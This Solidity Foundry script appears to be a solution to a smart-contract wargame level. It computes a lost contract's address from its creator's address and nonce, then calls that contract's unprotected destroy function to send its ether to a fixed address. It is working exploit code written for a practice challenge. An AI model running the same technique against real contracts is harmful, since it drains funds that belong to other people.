// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel17.sol";

contract POC is Script {

    function run() external{
        vm.startBroadcast();
        address payable lostcontract = payable(address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(0x38D39728294fBa01EB40B8DE2e64440Ae1376755), bytes1(0x01)))))));

        SimpleToken level15 = SimpleToken(lostcontract);
        level15.destroy(payable(0xE94eE0D98415D86ddbA0df1e8b733B4A332D3fbD));

        vm.stopBroadcast();
    }
}

